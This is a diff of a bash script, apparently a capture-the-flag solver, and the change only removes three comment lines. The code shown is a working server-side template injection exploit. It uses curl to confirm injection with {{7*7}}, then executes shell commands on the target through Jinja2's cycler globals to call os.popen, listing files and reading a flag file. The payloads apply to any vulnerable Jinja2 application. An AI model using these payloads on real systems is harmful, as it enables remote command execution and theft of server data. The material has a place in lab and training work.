@@ -15,7 +15,7 @@ URL="$1"
 
 echo "[*] Testing SSTI vulnerability..."
 
-# test SSTI
+
 TEST=$(curl -s -X POST "$URL" -d "message={{7*7}}")
 
 if echo "$TEST" | grep -q 49; then
@@ -27,7 +27,7 @@ fi
 echo
 echo "[*] Listing server files..."
 
-# payload to list files
+
 LIST_PAYLOAD="{{cycler.__init__.__globals__.os.popen('ls').read()}}"
 
 curl -s -X POST "$URL" \
@@ -36,7 +36,7 @@ curl -s -X POST "$URL" \
 echo
 echo "[*] Attempting to read flag..."
 
-# payload to read flag
+
 FLAG_PAYLOAD="{{cycler.__init__.__globals__.os.popen('cat flag').read()}}"
 
 FLAG=$(curl -s -X POST "$URL" \
